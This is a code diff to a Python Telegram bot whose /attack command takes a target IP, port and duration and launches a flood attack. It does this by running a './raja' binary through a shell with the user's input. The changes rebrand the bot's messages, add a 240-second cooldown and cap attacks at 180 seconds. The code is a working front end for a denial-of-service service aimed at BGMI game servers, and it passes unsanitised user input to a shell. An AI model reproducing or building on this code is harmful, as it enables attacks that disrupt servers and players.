@@ -235,12 +235,12 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     response = (
-        f"🎇𝗔𝘁𝘁𝗮𝗰𝗸 𝗜𝗻𝗶𝘁𝗶𝗮𝘁𝗲𝗱🎇\n\n"
-        f"🎯 𝗧𝗮𝗿𝗴𝗲𝘁: `{target}`\n"
-        f"🔌 𝗣𝗼𝗿𝘁: `{port}`\n"
-        f"⏳ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: `{time} seconds`\n"
-        f"🎮 𝗚𝗮𝗺𝗲: `𝗕𝗚𝗠𝗜`\n\n"
-        f"🚀 𝗛𝗮𝗻𝗴 𝘁𝗶𝗴𝗵𝘁! 𝗬𝗼𝘂𝗿 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀...🚀\n"
+        f"🎇Oғͥғɪᴄͣɪͫ͢͢͢ᴀℓ —͟͞͞Ꮅ𝙧ɇ𝙢īū𝙢—͟͞͞\n🔗 𝗜𝗻𝘀𝘁𝗮𝗹𝗹𝗶𝗻𝗴 𝗔𝘁𝘁𝗮𝗰𝗸 🔗🎇\n\n"
+        f"🎯 🅣𝑨𝑹𝑮𝑬𝑻: `{target}`\n"
+        f"🔌 Ƥ☢rtส: `{port}`\n"
+        f"⏳ Time▪out: `{time} seconds`\n"
+        f"🎮 Ɠคмε‿✶ 𝘽𝔾𝗠ｴ`\n\n"
+        f"🚀 ═══RAJA BHAI═══ @RAJARAJ_04...🚀\n"
         f"🌐 𝗠𝗼𝗻𝗶𝘁𝗼𝗿𝗶𝗻𝗴 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗳𝗼𝗿 𝗼𝗽𝘁𝗶𝗺𝗮𝗹 𝗽𝗲𝗿𝗳𝗼𝗿𝗺𝗮𝗻𝗰𝗲."
     )
     
@@ -255,7 +255,7 @@ def start_attack_reply(message, target, port, time):
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
-COOLDOWN_TIME =0
+COOLDOWN_TIME =240
 
 # Handler for /bgmi command
 @bot.message_handler(commands=['attack'])
@@ -265,7 +265,7 @@ def handle_bgmi(message):
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 240:
                 response = "⏳ 𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍 𝐁𝐀𝐁𝐘 ⏳\n🔺ᗯᗩᎥ丅 0 ᗰᎥᑎᑌ丅ᗴ🔻"
                 bot.reply_to(message, response)
                 return
@@ -277,15 +277,15 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 600:
-                response = "𝐓𝐈𝐌𝐄 𝐈𝐒 𝐕𝐄𝐑𝐘 𝐇𝐈𝐆𝐇 \n\n𝐓𝐑𝐘 𝐓𝐎 --> 6𝟎𝟎✅ \n𝐁𝐞𝐟𝐨𝐫𝐞 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐘𝐨𝐮𝐫 𝐀𝐭𝐭𝐚𝐜𝐤"
+            if time > 180:
+                response = "𝐓𝐈𝐌𝐄 𝐈𝐒 𝐕𝐄𝐑𝐘 𝐇𝐈𝐆𝐇 \n\n𝐓𝐑𝐘 𝐓𝐎 --> 18𝟎✅ \n𝐁𝐞𝐟𝐨𝐫𝐞 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐘𝐨𝐮𝐫 𝐀𝐭𝐭𝐚𝐜𝐤"
             else:
                 record_command_logs(user_id, '/attack', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./raja {target} {port} {time} 900"
                 subprocess.run(full_command, shell=True)
-                response = f"🔺𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄 𝐀𝐓𝐓𝐀𝐂𝐊🔻 \n\n💢𝗧𝗮𝗿𝗴𝗲𝘁 -> {target} \n💢𝗣𝗼𝗿𝘁: {port} \n💢𝗧𝗶𝗺𝗲: {time}"
+                response = f"🏆𝐀🅣𝐓𝐀𝐂𝐊 𝐅𝐈𝐍ｴ𝐒𝐇🏆\n🅣𝑨𝑹𝑮𝑬𝑻 :- {target}\nƤ☢rtส :- {port}\nTime▪out :- {time} \nƓคмε‿✶ 𝘽𝔾𝗠ｴ\n\n═══RAJA BHAI═══ @RAJARAJ_04!"
         else:
             response = "💠𝐈𝐭'𝐬 𝐓𝐢𝐦𝐞 𝐓𝐨 𝐀𝐭𝐭𝐚𝐜𝐤💠 \n\n/𝐚𝐭𝐭𝐚𝐜𝐤 <𝐭𝐚𝐫𝐠𝐞𝐭> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞>\n\nＲＥＡＤＹ ＦＯＲ ＳＥＸＸ"  # Updated command syntax
     else:
